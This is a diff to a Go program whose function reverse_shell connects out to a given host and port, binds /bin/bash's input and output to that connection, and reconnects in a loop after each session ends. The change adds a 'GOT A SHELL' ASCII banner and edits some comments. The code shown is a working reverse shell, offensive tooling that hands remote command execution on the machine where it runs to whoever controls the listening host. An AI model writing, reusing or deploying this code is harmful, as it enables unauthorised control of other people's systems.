@@ -1,6 +1,7 @@
 package main
 
 import (
+	"fmt"
 	"net"
 	"os/exec"
 	"time"
@@ -13,16 +14,17 @@ func reverse_shell(host string, port string) {
 		reverse_shell(host, port)
 	}
 
-	// Uses /bin/sh
+	// Uses /bin/sh & get
 	cmd := exec.Command("/bin/bash")
 
 	//Get user instructions
 	cmd.Stdin, cmd.Stdout, cmd.Stderr = connection, connection, connection
 
 	// Start connection
+	fmt.Println("\n██████╗  ██████╗ ████████╗     █████╗     ███████╗██╗  ██╗███████╗██╗     ██╗     \n██╔════╝ ██╔═══██╗╚══██╔══╝    ██╔══██╗    ██╔════╝██║  ██║██╔════╝██║     ██║     \n██║  ███╗██║   ██║   ██║       ███████║    ███████╗███████║█████╗  ██║     ██║     \n██║   ██║██║   ██║   ██║       ██╔══██║    ╚════██║██╔══██║██╔══╝  ██║     ██║     \n╚██████╔╝╚██████╔╝   ██║       ██║  ██║    ███████║██║  ██║███████╗███████╗███████╗\n╚═════╝  ╚═════╝    ╚═╝       ╚═╝  ╚═╝    ╚══════╝╚═╝  ╚═╝╚══════╝╚══════╝╚══════╝")
 	cmd.Run()
 
-	// Close connection
+	// Then close connection
 	connection.Close()
 	reverse_shell(host, port)
 }
